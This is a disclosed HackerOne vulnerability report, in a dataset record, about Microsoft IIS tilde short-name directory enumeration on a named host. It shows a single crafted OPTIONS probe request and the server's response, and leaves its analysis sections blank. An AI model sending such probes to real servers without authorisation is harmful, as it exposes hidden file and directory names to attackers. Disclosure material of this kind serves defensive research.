---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '148777'
original_report_id: '148777'
title: Microsoft IIS tilde directory enumeration
weakness: Information Disclosure
team_handle: radancy
created_at: '2016-07-02T00:36:27.317Z'
disclosed_at: '2017-03-31T02:17:39.443Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 10
tags:
- hackerone
- information-disclosure
---

# Microsoft IIS tilde directory enumeration

## Metadata

- HackerOne Report ID: 148777
- Weakness: Information Disclosure
- Program: radancy
- Disclosed At: 2017-03-31T02:17:39.443Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Request
OPTIONS //*~1*/a.aspx?aspxerrorpath=/ HTTP/1.1
Host: exactrd.maximum.nl
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36
Accept: */*

Response
HTTP/1.1 404 Not Found
Content-Type: text/html
Server: Microsoft-IIS/8.0
X-Powered-By: ASP.NET
Date: Sat, 02 Jul 2016 00:35:22 GMT
Content-Length: 1245

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
